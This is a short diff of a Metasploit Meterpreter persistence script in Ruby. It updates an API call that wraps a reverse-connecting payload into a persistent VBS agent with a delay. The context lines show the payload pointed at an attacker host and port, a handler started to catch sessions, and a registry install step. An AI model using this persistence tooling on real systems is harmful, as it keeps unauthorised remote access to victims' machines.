@@ -60,7 +60,7 @@ pay.datastore['LHOST'] = rhost
 pay.datastore['LPORT'] = rport
 raw  = pay.generate
 
-vbs = ::Msf::Util::EXE.to_win32pe_vbs(client.framework, raw, true, delay)
+vbs = ::Msf::Util::EXE.to_win32pe_vbs(client.framework, raw, {:persist => true, :delay => 5})
 print_status("Persistent agent script is #{vbs.length} bytes long")
 
 
@@ -91,7 +91,7 @@ if(autoconn)
 	mul.datastore['LHOST']   = rhost
 	mul.datastore['LPORT']   = rport
 	mul.datastore['ExitOnSession'] = false
-	
+
 	mul.exploit_simple(
 		'Payload'        => mul.datastore['PAYLOAD'],
 		'RunAsJob'       => true
@@ -112,5 +112,4 @@ if(install)
 		print_status("Error: failed to open the registry key for writing")
 	end
 end
-
 
